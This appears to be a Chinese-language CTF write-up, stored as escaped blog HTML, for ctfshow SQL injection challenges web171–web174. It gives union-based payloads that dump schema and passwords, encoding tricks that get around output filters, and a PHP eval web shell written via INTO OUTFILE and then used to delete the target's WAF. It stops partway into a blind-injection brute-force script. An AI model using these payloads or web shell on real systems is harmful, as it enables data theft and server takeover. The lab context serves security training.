item.description:
 &lt;h1 id=&#34;web171&#34;&gt;&lt;a href=&#34;#web171&#34; class=&#34;headerlink&#34; title=&#34;web171&#34;&gt;&lt;/a&gt;web171&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目查询语句如下&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;$sql = &amp;quot;select username,password from user where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39; limit 1;&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;当我们输入 &lt;code&gt;id=1&lt;/code&gt; 的时候，语句代入数据库中查询&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;select username,password from user where username !=&amp;#39;flag&amp;#39; and id =&amp;#39;1&amp;#39; limit 1;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;如果我们加个单引号&lt;/strong&gt;	&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;select username,password from user where username !=&amp;#39;flag&amp;#39; and id =&amp;#39;1&amp;#39;&amp;#39; limit 1;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;出现语句不规范，报错&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果在后面加个注释符，即变成&lt;code&gt;id=1&amp;#39;--+&lt;/code&gt;，注释符 &lt;code&gt;--+&lt;/code&gt; 会把后面的语句全注释掉，就不会报错，语句就变成了&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;select username,password from user where username !=&amp;#39;flag&amp;#39; and id =&amp;#39;1&amp;#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用 &lt;code&gt;order by&lt;/code&gt; 查询列数，当到 &lt;code&gt;order by 3&lt;/code&gt; 没有报错，即为3列&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; order by 3--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;将 &lt;code&gt;id&lt;/code&gt; 改成 &lt;code&gt;-1&lt;/code&gt; 把查询 &lt;code&gt;id&lt;/code&gt; 回显的数据置空，查询库名 &lt;code&gt;ctfshow_web&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,2,database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823104847789.png&#34; alt=&#34;image-20250823104847789&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;group_concat()&lt;/code&gt; 会把多行的结果拼接成一行，中间用逗号分隔。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询表名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;ctfshow_web&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823105128348.png&#34; alt=&#34;image-20250823105128348&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_user&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823105820909.png&#34; alt=&#34;image-20250823105820909&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询字段记录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; union select 1,2,password from ctfshow_user--+

-1&amp;#39; union select group_concat(id),group_concat(username),group_concat(password) from ctfshow_user--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823110049881.png&#34; alt=&#34;image-20250823110049881&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;万能密码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; or 1=1--+
1&amp;#39; or 1=1%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250425132646554.png&#34; alt=&#34;image-20250425132646554&#34; style=&#34;zoom: 25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web172&#34;&gt;&lt;a href=&#34;#web172&#34; class=&#34;headerlink&#34; title=&#34;web172&#34;&gt;&lt;/a&gt;web172&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;题目查询语句及返回逻辑如下&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;//拼接sql语句查找指定ID用户
$sql = &amp;quot;select username,password from ctfshow_user2 where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39; limit 1;&amp;quot;;

//检查结果是否有flag
    if($row-&amp;gt;username!==&amp;#39;flag&amp;#39;)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;查询成功&amp;#39;;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;可知，flag位于 &lt;code&gt;ctfshow_user2&lt;/code&gt; 表中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列数为2&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; order by 2--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823110527357.png&#34; alt=&#34;image-20250823110527357&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询库名 &lt;code&gt;ctfshow_web&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823110625365.png&#34; alt=&#34;image-20250823110625365&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询表名，有两个表&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;ctfshow_web&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823111050401.png&#34; alt=&#34;image-20250823111050401&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;quot;ctfshow_user2&amp;quot; --+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823111231458.png&#34; alt=&#34;image-20250823111231458&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询字段记录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,password from ctfshow_user2--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823111325732.png&#34; alt=&#34;image-20250823111325732&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;由题目查询语句及返回逻辑可以构造如下&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select username,password from ctfshow_user2--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;但当 &lt;code&gt;username&lt;/code&gt; 里有“flag”时无法输出，所以可以将字段记录转成Hex、ASCII、base64等编码输出&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select to_base64(username),password from ctfshow_user2--+
-1&amp;#39; union select hex(username),password from ctfshow_user2--+
-1&amp;#39; union select ASCII(username),password from ctfshow_user2--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823112205922.png&#34; alt=&#34;image-20250823112205922&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;只查出 &lt;code&gt;username&lt;/code&gt; 为 &lt;code&gt;flag&lt;/code&gt; 的那一行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,password from ctfshow_user2 where username=&amp;#39;flag&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823112820711.png&#34; alt=&#34;image-20250823112820711&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web173&#34;&gt;&lt;a href=&#34;#web173&#34; class=&#34;headerlink&#34; title=&#34;web173&#34;&gt;&lt;/a&gt;web173&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,password from ctfshow_user2 where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
//检查结果是否有flag
    if(!preg_match(&amp;#39;/flag/i&amp;#39;, json_encode($ret)))&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;查询成功&amp;#39;;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列数为2&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; order by 3--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823125803070.png&#34; alt=&#34;image-20250823125803070&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询库名 &lt;code&gt;ctfshow_web&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,2,database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823130255385.png&#34; alt=&#34;image-20250823130255385&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询表名，有三个表&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;ctfshow_web&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823130231610.png&#34; alt=&#34;image-20250823130231610&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;quot;ctfshow_user3&amp;quot; --+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823130337037.png&#34; alt=&#34;image-20250823130337037&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询字段记录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,2,password from ctfshow_user3--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823130421126.png&#34; alt=&#34;image-20250823130421126&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;由题目查询语句及返回逻辑可以构造如下&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,username,password from ctfshow_user3--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;但当 &lt;code&gt;username&lt;/code&gt; 里有“flag”时无法输出，所以可以将字段记录转成Hex、ASCII、base64等编码输出&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,to_base64(username),password from ctfshow_user3--+
-1&amp;#39; union select 1,hex(username),password from ctfshow_user3--+
-1&amp;#39; union select 1,ASCII(username),password from ctfshow_user3--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823131137945.png&#34; alt=&#34;image-20250823131137945&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;只查出 &lt;code&gt;username&lt;/code&gt; 为 &lt;code&gt;flag&lt;/code&gt; 的那一行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select 1,2,password from ctfshow_user3 where username=&amp;#39;flag&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823130811066.png&#34; alt=&#34;image-20250823130811066&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web174&#34;&gt;&lt;a href=&#34;#web174&#34; class=&#34;headerlink&#34; title=&#34;web174&#34;&gt;&lt;/a&gt;web174&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;//拼接sql语句查找指定ID用户
$sql = &amp;quot;select username,password from ctfshow_user4 where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
//检查结果是否有flag
    if(!preg_match(&amp;#39;/flag|[0-9]/i&amp;#39;, json_encode($ret)))&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;查询成功&amp;#39;;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;由于数字被过滤，可以将回显的结果用大写字母替换，替换规则如下&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;replace(group_concat(table_name),
        &amp;#39;1&amp;#39;,&amp;#39;A&amp;#39;),
        &amp;#39;2&amp;#39;,&amp;#39;B&amp;#39;),
        &amp;#39;3&amp;#39;,&amp;#39;C&amp;#39;),
        &amp;#39;4&amp;#39;,&amp;#39;D&amp;#39;),
        &amp;#39;5&amp;#39;,&amp;#39;E&amp;#39;),
        &amp;#39;6&amp;#39;,&amp;#39;F&amp;#39;),
        &amp;#39;7&amp;#39;,&amp;#39;G&amp;#39;),
        &amp;#39;8&amp;#39;,&amp;#39;H&amp;#39;),
        &amp;#39;9&amp;#39;,&amp;#39;I&amp;#39;),
        &amp;#39;0&amp;#39;,&amp;#39;J&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列数为2&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; order by 2--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823170725372.png&#34; alt=&#34;image-20250823170725372&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询库名 &lt;code&gt;ctfshow_web&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select &amp;#39;a&amp;#39;,database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823170709800.png&#34; alt=&#34;image-20250823170709800&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询表名，只有一个表&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select &amp;#39;a&amp;#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),&amp;#39;1&amp;#39;,&amp;#39;A&amp;#39;),&amp;#39;2&amp;#39;,&amp;#39;B&amp;#39;),&amp;#39;3&amp;#39;,&amp;#39;C&amp;#39;),&amp;#39;4&amp;#39;,&amp;#39;D&amp;#39;),&amp;#39;5&amp;#39;,&amp;#39;E&amp;#39;),&amp;#39;6&amp;#39;,&amp;#39;F&amp;#39;),&amp;#39;7&amp;#39;,&amp;#39;G&amp;#39;),&amp;#39;8&amp;#39;,&amp;#39;H&amp;#39;),&amp;#39;9&amp;#39;,&amp;#39;I&amp;#39;),&amp;#39;0&amp;#39;,&amp;#39;J&amp;#39;) from information_schema.tables where table_schema=&amp;#39;ctfshow_web&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823170643934.png&#34; alt=&#34;image-20250823170643934&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询列名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select &amp;#39;a&amp;#39;,group_concat(column_name) from information_schema.columns where table_name=&amp;quot;ctfshow_user4&amp;quot; --+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823170943945.png&#34; alt=&#34;image-20250823170943945&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询字段记录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select &amp;#39;a&amp;#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&amp;#39;1&amp;#39;,&amp;#39;A&amp;#39;),&amp;#39;2&amp;#39;,&amp;#39;B&amp;#39;),&amp;#39;3&amp;#39;,&amp;#39;C&amp;#39;),&amp;#39;4&amp;#39;,&amp;#39;D&amp;#39;),&amp;#39;5&amp;#39;,&amp;#39;E&amp;#39;),&amp;#39;6&amp;#39;,&amp;#39;F&amp;#39;),&amp;#39;7&amp;#39;,&amp;#39;G&amp;#39;),&amp;#39;8&amp;#39;,&amp;#39;H&amp;#39;),&amp;#39;9&amp;#39;,&amp;#39;I&amp;#39;),&amp;#39;0&amp;#39;,&amp;#39;J&amp;#39;) from ctfshow_user4--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823170601866.png&#34; alt=&#34;image-20250823170601866&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将回显的flag用脚本处理，恢复正确内容&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823171310535.png&#34; alt=&#34;image-20250823171310535&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;def rev_replace(txt):
    repl = &amp;#123;
        &amp;#39;A&amp;#39;: &amp;#39;1&amp;#39;,
        &amp;#39;B&amp;#39;: &amp;#39;2&amp;#39;,
        &amp;#39;C&amp;#39;: &amp;#39;3&amp;#39;,
        &amp;#39;D&amp;#39;: &amp;#39;4&amp;#39;,
        &amp;#39;E&amp;#39;: &amp;#39;5&amp;#39;,
        &amp;#39;F&amp;#39;: &amp;#39;6&amp;#39;,
        &amp;#39;G&amp;#39;: &amp;#39;7&amp;#39;,
        &amp;#39;H&amp;#39;: &amp;#39;8&amp;#39;,
        &amp;#39;I&amp;#39;: &amp;#39;9&amp;#39;,
        &amp;#39;J&amp;#39;: &amp;#39;0&amp;#39;
    &amp;#125;

    for k, v in repl.items():
        txt = txt.replace(k, v)

    return txt

txt = input(&amp;quot;输入：&amp;quot;)
out = rev_replace(txt)
print(&amp;quot;替换后: &amp;quot;, out)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;只查出 &lt;code&gt;username&lt;/code&gt; 为 &lt;code&gt;flag&lt;/code&gt; 的那一行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select &amp;#39;a&amp;#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&amp;#39;1&amp;#39;,&amp;#39;A&amp;#39;),&amp;#39;2&amp;#39;,&amp;#39;B&amp;#39;),&amp;#39;3&amp;#39;,&amp;#39;C&amp;#39;),&amp;#39;4&amp;#39;,&amp;#39;D&amp;#39;),&amp;#39;5&amp;#39;,&amp;#39;E&amp;#39;),&amp;#39;6&amp;#39;,&amp;#39;F&amp;#39;),&amp;#39;7&amp;#39;,&amp;#39;G&amp;#39;),&amp;#39;8&amp;#39;,&amp;#39;H&amp;#39;),&amp;#39;9&amp;#39;,&amp;#39;I&amp;#39;),&amp;#39;0&amp;#39;,&amp;#39;J&amp;#39;) from ctfshow_user4 where username=&amp;#39;flag&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823172630606.png&#34; alt=&#34;image-20250823172630606&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将查询结果写入靶机服务器&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; union select username,password from ctfshow_user4 into outfile &amp;#39;/var/www/html/flag.txt&amp;#39;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/flag.txt&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/flag.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823181144483.png&#34; alt=&#34;image-20250823181144483&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解四&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;写入木马&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;-1&amp;#39; union select &amp;#39;a&amp;#39;,&amp;lt;?php @eval($_POST[a]);?&amp;gt; into outfile &amp;quot;/var/www/html/1.php&amp;quot;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;可以访问 &lt;code&gt;/1.php&lt;/code&gt; 说明写入成功&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823205557176.png&#34; alt=&#34;image-20250823205557176&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;连接蚁剑&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823205031913.png&#34; alt=&#34;image-20250823205031913&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 &lt;code&gt;/var/www/html/api/v4.php&lt;/code&gt; 删掉 waf 语句&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823204905296.png&#34; alt=&#34;image-20250823204905296&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;回到查询页面，可正常无过滤注入&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;1&amp;#39; union select 1,password from ctfshow_user4--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823204825960.png&#34; alt=&#34;image-20250823204825960&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解五&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询注入接口为 &lt;code&gt;/api/v4.php&lt;/code&gt; ，并非靶机查询页面网址&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823233438947.png&#34; alt=&#34;image-20250823233438947&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;极速脚本解题&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250823233046012.png&#34; alt=&#34;image-20250823233046012&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===================== 配置区 =====================
URL = &amp;quot;http://62350fa3-1f63-4684-9981-7787a1bc0d90.challenge.ctf.show/api/v4.php&amp;quot;  # 目标地址
CHARSET = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;#123;&amp;#125;-&amp;quot;  # 爆破字典
TARGET_USER = &amp;quot;flag&amp;quot;   # 目标用户名
MAX_LEN = 50           # 爆破长度上限
THREADS = 10           # 并发线程数
DEBUG = False          # 是否打印调试信息（True/False）

